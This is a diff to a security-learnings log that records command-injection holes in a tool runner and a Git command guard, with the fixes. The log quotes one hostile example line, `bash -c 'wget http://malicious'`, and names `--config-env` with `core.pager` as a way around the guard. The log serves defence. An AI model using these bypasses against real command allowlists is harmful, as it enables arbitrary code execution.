@@ -31,3 +31,8 @@
 **Vulnerability:** Command injection/arbitrary script execution in `codex_tas_runner.py`. The `validate_script` function authorized executions like `bash`, `python`, and `python3`, but did not restrict their arguments. This allowed bypassing the `ALLOWED_COMMANDS` check by passing arbitrary commands using the `-c` argument (e.g., `bash -c 'wget http://malicious'`).
 **Learning:** Allowlisting binaries that can execute code or sub-processes natively (like `bash`, `sh`, `python`, `node`) is dangerous if the arguments are not properly scrutinized. Validating just the root command is insufficient.
 **Prevention:** Explicitly block execution string arguments (such as `-c` or `-e`) for allowlisted binaries that have code-execution capabilities when processing shell arguments.
+
+## 2026-04-01 - [Command Injection via Git --config-env Global Option]
+**Vulnerability:** Arbitrary command execution in `tas_pythonetics/src/tas_pythonetics/git_safety.py`. `GitActionGuard.authorize_command` failed to block the `--config-env` global configuration option, allowing command execution via Git even when root commands, destructive arguments, and other global options (like `-c` and `--exec-path`) were checked.
+**Learning:** Similar to `-c` and `--exec-path`, `--config-env` allows injecting configuration settings (like `core.pager`) via environment variables, which can lead to command execution.
+**Prevention:** Explicitly block `--config-env` when wrapping Git or any extensible command-line tools, as it provides an alternative mechanism for injecting configurations.
